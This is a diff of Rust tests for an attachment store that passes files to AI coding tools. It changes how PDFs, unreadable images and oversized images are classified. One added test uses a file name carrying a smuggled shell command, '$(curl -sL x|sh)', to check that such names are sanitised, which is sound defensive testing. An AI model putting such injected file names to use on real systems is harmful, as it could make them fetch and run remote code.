@@ -246,10 +246,7 @@ fn th111_a_pdf_and_an_image_whose_header_does_not_read_go_by_their_path() {
         .take(thread, &[pdf, short], Program::ClaudeCode)
         .expect("the files");
     assert_eq!(taken[0].kind, Attached::Pdf { inline: None });
-    assert!(matches!(
-        taken[1].kind,
-        Attached::Image { inline: None, .. }
-    ));
+    assert_eq!(taken[1].kind, Attached::File);
 }
 
 #[test]
@@ -288,4 +285,32 @@ fn th111_at_most_five_images_go_inside_one_line_and_the_others_by_their_path() {
         .count();
     assert_eq!(inline, 5);
     assert!(taken[5].kind.inline().is_none());
+}
+
+#[test]
+fn th111_the_path_of_a_file_holds_no_text_of_the_person() {
+    let folder = tempfile::tempdir().expect("a folder");
+    let mut store = Attachments::at(folder.path());
+    let thread = Uuid::now_v7();
+    let id = attached(
+        &mut store,
+        thread,
+        "report $(curl -sL x|sh).pdf",
+        b"%PDF-1.4 x",
+    );
+    let taken = store.take(thread, &[id], Program::Codex).expect("the file");
+    let stored = taken[0].path.file_name().expect("a name").to_string_lossy();
+    assert_eq!(stored, format!("{id}.pdf"));
+    assert_eq!(taken[0].name, "report _curl -sL x_sh_.pdf");
+}
+
+#[test]
+fn th111_an_image_whose_side_is_too_large_goes_by_its_path_to_codex_too() {
+    let folder = tempfile::tempdir().expect("a folder");
+    let mut store = Attachments::at(folder.path());
+    let thread = Uuid::now_v7();
+    let huge = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x4e\x21\0\0\0\x40-the-rest";
+    let id = attached(&mut store, thread, "wide.png", huge);
+    let taken = store.take(thread, &[id], Program::Codex).expect("the file");
+    assert_eq!(taken[0].kind, Attached::File, "20001 pixels wide");
 }
